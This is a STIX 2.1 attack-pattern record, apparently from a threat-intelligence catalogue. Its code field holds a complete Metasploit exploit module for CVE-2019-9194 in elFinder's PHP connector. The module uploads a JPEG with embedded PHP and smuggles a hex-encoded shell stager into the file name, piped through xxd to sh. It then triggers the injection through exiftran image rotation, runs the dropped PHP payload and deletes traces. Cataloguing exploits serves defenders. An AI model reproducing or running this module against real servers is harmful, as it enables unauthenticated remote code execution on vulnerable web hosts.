{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--08bff02c-05e3-4f75-9041-06fedd40201e",
    "created": "2024-08-14T17:12:47.779497Z",
    "modified": "2024-08-14T17:12:47.779501Z",
    "name": "elFinder PHP Connector exiftran Command Injection",
    "description": " This module exploits a command injection vulnerability in elFinder versions prior to 2.1.48.  The PHP connector component allows unauthenticated users to upload files and perform file modification operations, such as resizing and rotation of an image. The file name of uploaded files is not validated allowing shell metacharacters.  When performing image operations on JPEG files, the filename is passed to the `exiftran` utility without appropriate sanitization, causing shell commands in the file name to be executed, resulting in remote command injection as the web server user.  The PHP connector is not enabled by default.  The system must have `exiftran` installed and in `$PATH`.  This module has been tested successfully on elFinder versions 2.1.47 2.1.20 and 2.1.16 on Ubuntu.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/elfinder_php_connector_exiftran_cmd_injection.rb",
            "external_id": "elfinder_php_connector_exiftran_cmd_injection.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-9194"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/Studio-42/elFinder/releases/tag/2.1.48"
        },
        {
            "source_name": "reference",
            "url": "https://www.secsignal.org/news/cve-2019-9194-triggering-and-exploiting-a-1-day-vulnerability/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'elFinder PHP Connector exiftran Command Injection',\n      'Description'    => %q{\n        This module exploits a command injection vulnerability in elFinder\n        versions prior to 2.1.48.\n\n        The PHP connector component allows unauthenticated users to upload\n        files and perform file modification operations, such as resizing and\n        rotation of an image. The file name of uploaded files is not validated,\n        allowing shell metacharacters.\n\n        When performing image operations on JPEG files, the filename is passed\n        to the `exiftran` utility without appropriate sanitization, causing\n        shell commands in the file name to be executed, resulting in remote\n        command injection as the web server user.\n\n        The PHP connector is not enabled by default.\n\n        The system must have `exiftran` installed and in `$PATH`.\n\n        This module has been tested successfully on elFinder versions 2.1.47,\n        2.1.20 and 2.1.16 on Ubuntu.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Thomas Chauchefoin', # Discovery\n          'q3rv0',              # Exploit\n          'bcoles'              # Metasploit\n        ],\n      'References'     =>\n        [\n          ['CVE', '2019-9194'],\n          ['EDB', '46481'],\n          ['URL', 'https://github.com/Studio-42/elFinder/releases/tag/2.1.48'],\n          ['URL', 'https://www.secsignal.org/news/cve-2019-9194-triggering-and-exploiting-a-1-day-vulnerability/']\n        ],\n      'Arch'           => ARCH_PHP,\n      'Platform'       => 'php',\n      'Targets'        => [['Auto', {}]],\n      'Privileged'     => false,\n      'DisclosureDate' => '2019-02-26',\n      'DefaultTarget'  => 0))\n\n    register_options [\n      OptString.new('TARGETURI', [true, 'The base path to elFinder', '/elFinder/'])\n    ]\n  end\n\n  #\n  # Check if /php/connector.minimal.php exists and is executable\n  #\n  def check\n    uri = normalize_uri(target_uri.path, 'php', 'connector.minimal.php')\n    res = send_request_cgi('uri' => uri)\n\n    unless res\n      vprint_error 'Connection failed'\n      return CheckCode::Unknown\n    end\n\n    unless res.code == 200\n      vprint_status \"#{uri} does not exist\"\n      return CheckCode::Safe\n    end\n\n    if res.body.include? '<?php'\n      vprint_status 'PHP is not enabled'\n      return CheckCode::Safe\n    end\n\n    CheckCode::Detected\n  end\n\n  #\n  # Upload PHP payload\n  #\n  def upload(fname)\n    # Small JPEG file from:\n    # https://github.com/mathiasbynens/small/blob/master/jpeg.jpg\n    jpeg = %w[\n      FF D8 FF DB 00 43 00 03 02 02 02 02 02 03 02 02\n      02 03 03 03 03 04 06 04 04 04 04 04 08 06 06 05\n      06 09 08 0A 0A 09 08 09 09 0A 0C 0F 0C 0A 0B 0E\n      0B 09 09 0D 11 0D 0E 0F 10 10 11 10 0A 0C 12 13\n      12 10 13 0F 10 10 10 FF C9 00 0B 08 00 01 00 01\n      01 01 11 00 FF CC 00 06 00 10 10 05 FF DA 00 08\n      01 01 00 00 3F 00 D2 CF 20 FF D9\n    ]\n    jpeg = [jpeg.join].pack('H*')\n    jpeg << rand_text_alphanumeric(50..100)\n    jpeg << \"<?php #{payload.encoded} ?>\"\n    jpeg << rand_text_alphanumeric(50..100)\n\n    data = Rex::MIME::Message.new\n    data.add_part('upload', nil, nil, 'form-data; name=\"cmd\"')\n    data.add_part('l1_Lw', nil, nil, 'form-data; name=\"target\"')\n    data.add_part(jpeg, 'image/jpeg', nil, %(form-data; name=\"upload[]\"; filename=\"#{fname}\"))\n    post_data = data.to_s\n\n    print_status(\"Uploading payload '#{fname}' (#{post_data.length} bytes)\")\n\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri'    => normalize_uri(target_uri.path, 'php', 'connector.minimal.php'),\n      'ctype'  => \"multipart/form-data; boundary=#{data.bound}\",\n      'data'   => post_data\n    )\n\n    unless res\n      fail_with Failure::Unreachable, 'Connection failed'\n    end\n\n    unless res.code == 200\n      fail_with Failure::UnexpectedReply, 'Unexpected reply'\n    end\n\n    unless res.body.include?('\"added\"')\n      fail_with Failure::UnexpectedReply, \"Upload failed: #{res.body}\"\n    end\n\n    if res.body.include?('\"error\"') || res.body.include?('\"warning\"')\n      fail_with Failure::UnexpectedReply, \"Upload failed: #{res.body}\"\n    end\n\n    json_res = JSON.parse(res.body) rescue nil\n\n    if json_res.nil? || json_res['added'].empty?\n      fail_with Failure::UnexpectedReply, \"Upload failed: #{res.body}\"\n    end\n\n    json_res['added'].first['hash'] || ''\n  end\n\n  #\n  # Trigger the command injection via image rotation functionality\n  # Rotates image by 180 degrees to trigger `exiftran` code path\n  #\n  def trigger(hash)\n    print_status 'Triggering vulnerability via image rotation ...'\n\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'php', 'connector.minimal.php'),\n      'vars_get' => {\n        'target' => hash,\n        'degree' => '180',\n        'mode'   => 'rotate',\n        'cmd'    => 'resize'\n      }\n    }, 5)\n\n    unless res\n      fail_with Failure::Unreachable, 'Connection failed'\n    end\n\n    if res.body.include?('\"error\"') || res.body.include?('\"warning\"')\n      fail_with Failure::UnexpectedReply, \"Image rotate failed: #{res.body}\"\n    end\n  end\n\n  #\n  # Delete uploaded file\n  #\n  def delete_file(hash)\n    print_status 'Removing uploaded file ...'\n\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'php', 'connector.minimal.php'),\n      'vars_get' => {\n        'cmd' => 'rm',\n        'targets[]' => hash\n      }\n    }, 15)\n\n    unless res\n      print_status 'Connection failed'\n      return\n    end\n\n    if res.body.include?('errFileNotFound')\n      print_error \"Could not delete uploaded file. Unexpected reply: #{res.body}\"\n      return\n    end\n\n    print_good 'Deleted uploaded file'\n  end\n\n  #\n  # Execute payload\n  #\n  def execute_payload(php_fname)\n    path = normalize_uri(target_uri.path, 'php', php_fname)\n\n    print_status \"Executing payload (#{path}) ...\"\n\n    res = send_request_cgi({\n      'uri' => path\n    }, 15)\n\n    unless res\n      print_status 'No reply'\n      return\n    end\n\n    unless res.code == 200\n      fail_with Failure::UnexpectedReply, \"Executing payload failed (HTTP #{res.code})\"\n    end\n  end\n\n  #\n  # Remove uploaded file\n  #\n  def cleanup\n    delete_file @hash unless @hash.nil?\n  ensure\n    super\n  end\n\n  #\n  # upload && execute\n  #\n  def exploit\n    unless check == CheckCode::Detected\n      fail_with Failure::NotVulnerable, 'Target is not vulnerable'\n    end\n\n    fname = rand_text_alphanumeric(6..10)\n    php_fname = \".#{rand_text_alphanumeric(6..10)}.php\"\n\n    # Max file name length is ~250 characters\n    # and characters such as `/` are forbidden.\n    # Hex encoded stager copies the uploaded file from the `files` directory\n    # to the working directory (`php`) and changes the extension to `.php`\n    # The stager is decoded with xxd when the vuln is triggered.\n    stager = \"cp ../files/#{fname}.jpg*echo* #{php_fname}\"\n\n    # Upload our payload jpg file with encoded stager in the filename\n    jpg_fname = \"#{fname}.jpg;echo #{stager.unpack('H*').flatten.first} |xxd -r -p |sh& #.jpg\"\n    @hash = upload jpg_fname\n\n    if @hash.to_s == ''\n      fail_with Failure::Unknown, 'Upload failed: Failed to retrieve file hash ID'\n    end\n\n    trigger @hash\n\n    register_file_for_cleanup php_fname\n\n    execute_payload php_fname\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-02-26",
    "x_mitre_platforms": [
        "php'"
    ]
}